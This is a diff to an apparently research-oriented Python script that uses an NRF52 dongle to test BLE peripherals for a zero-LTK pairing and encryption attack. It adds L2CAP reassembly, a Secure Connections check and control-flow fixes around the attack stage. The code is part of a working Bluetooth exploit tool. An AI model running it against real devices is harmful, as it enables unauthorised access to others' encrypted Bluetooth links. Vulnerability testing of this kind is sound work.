@@ -44,6 +44,11 @@ encryption_enabled = False
 slave_addr_type = 0
 smp_retries = 0
 run_script = True
+# l2cap reassembly
+fragment_start = False
+fragment_left = 0
+fragment = None
+
 # Autoreset colors
 colorama.init(autoreset=True)
 
@@ -166,6 +171,29 @@ def receive_encrypted(pkt):
         return BTLE(access_address + chr(header) + chr(length) + dec_pkt + '\x00\x00\x00')
 
 
+def defragment_l2cap(pkt):
+    global fragment, fragment_start, fragment_left
+    # Handle L2CAP fragment
+    if L2CAP_Hdr in pkt and pkt[L2CAP_Hdr].len + 4 > pkt[BTLE_DATA].len:
+        fragment_start = True
+        fragment_left = pkt[L2CAP_Hdr].len
+        fragment = raw(pkt)[:-3]
+        return None
+    elif fragment_start and BTLE_DATA in pkt and pkt[BTLE_DATA].LLID == 0x01:
+        fragment_left -= pkt[BTLE_DATA].len + 4
+        fragment += raw(pkt[BTLE_DATA].payload)
+        if pkt[BTLE_DATA].len >= fragment_left:
+            fragment_start = False
+            pkt = BTLE(fragment + '\x00\x00\x00')
+            pkt.len = len(pkt[BTLE_DATA].payload)  # update ble header length
+            return pkt
+        else:
+            return None
+    else:
+        fragment_start = False
+        return pkt
+
+
 # Open serial port of NRF52 Dongle
 driver = NRF52Dongle(serial_port, '115200', logs_pcap=True, pcap_filename='zero_ltk_capture.pcap')
 # Send scan request
@@ -231,10 +259,6 @@ while run_script:
             # them!!!
             driver.send(conn_request)
 
-        elif BTLE_EMPTY_PDU in pkt:
-
-            pass
-
         elif BTLE_DATA in pkt and connecting == True:
             connecting = False
             print(Fore.GREEN + 'Slave Connected (Link Layer data channel established)')
@@ -275,6 +299,12 @@ while run_script:
 
         # THE ATTACK STARTS HERE !!!!
         elif SM_Pairing_Response in pkt:
+            # Check if peripheral accepted secure connections pairing
+            if not (pkt.authentication & 0x08):
+                print(Fore.RED + 'Peripheral does not accept Secure Connections pairing\nEnding Test...')
+                run_script = False
+                end_connection = True
+
             start_timeout('smp_timeout', SCAN_TIMEOUT, smp_timeout)
             # Pairing request accepted
             # ediv and rand are 0 on first time pairing
@@ -325,8 +355,9 @@ while run_script:
         elif LL_REJECT_IND in pkt or SM_Failed in pkt:
             print(Fore.GREEN + 'Slave rejected attack. You are safe!')
             end_connection = True
+            run_script = False
 
-        elif end_connection == True:
+        if end_connection == True:
             end_connection = False
             encryption_enabled = False
             scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
